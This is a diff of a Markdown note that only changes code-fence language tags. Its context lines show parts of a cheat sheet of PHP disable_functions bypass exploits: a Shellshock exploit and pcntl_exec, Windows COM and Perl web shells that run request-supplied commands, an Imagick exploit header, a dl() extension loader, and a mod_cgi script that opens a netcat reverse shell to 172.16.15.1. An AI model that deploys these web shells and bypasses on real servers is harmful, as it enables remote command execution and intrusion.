@@ -16,7 +16,7 @@ tags:
 
 ### PHP 5.x Shellshock Exploit
 
-```
+```php
 # Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions)
 # CVE: CVE-2014-6271
 <pre>
@@ -45,7 +45,7 @@ echo shellshock($_REQUEST["cmd"]);
 
 ### mod_cgi
 
-```
+```php
 <?php
 // Only working with mod_cgi, writable dir and htaccess files enabled
 $cmd = "nc -c '/bin/bash' 172.16.15.1 4444"; //command to be executed
@@ -89,7 +89,7 @@ else
 
 PHP 4 >= 4.2.0, PHP 5 on linux
 
-```
+```php
 #/tmp/hack.sh
 #!/bin/bash
 ls -l /
@@ -98,7 +98,7 @@ ls -l /
 <?php pcntl_exec(“/bin/bash”, array(“/tmp/hack.sh”));?>
 ```
 
-```
+```php
 <?php
 $cmd = @$_REQUEST[cmd];
 if(function_exists('pcntl_exec')) {
@@ -111,7 +111,7 @@ if(function_exists('pcntl_exec')) {
 ?>
 ```
 
-```
+```php
 <?php 
 /*******************************
  *查看phpinfo编译参数--enable-pcntl
@@ -163,7 +163,7 @@ if(function_exists('pcntl_exec')) {
 
 ### windows system components
 
-```
+```php
 <?php
 
 $command=$_POST[a];
@@ -183,7 +183,7 @@ echo $stroutput
 
 ### PHP Perl Extension Safe_mode Bypass Exploit
 
-```
+```php
 <?php
  
 ##########################################################
@@ -211,7 +211,7 @@ echo "<br><form>CMD: <input type=text name=cmd value='".$_GET['cmd']."' size=25>
 
 ### Imagick  <= 3.3.0 PHP >= 5.4 Exploit
 
-```
+```php
 # Exploit Title: PHP Imagick disable_functions Bypass
 # Date: 2016-05-04
 # Exploit Author: RicterZ (ricter@chaitin.com)
@@ -311,7 +311,7 @@ Installing shared extensions:     /usr/local/lib/php/extensions/no-debug-non-zts
 
 将生成文件上传至extension_dir目录下，若extension_dir目录无写权限则可写入任意目录用../../来绕过并调用。
 
-```
+```php
 <?php
 dl("dl.so");  //dl.so在extension_dir目录，如不在则用../../来实现调用
 confirm_dl_compiled("$_GET[a]&gt;1.txt");
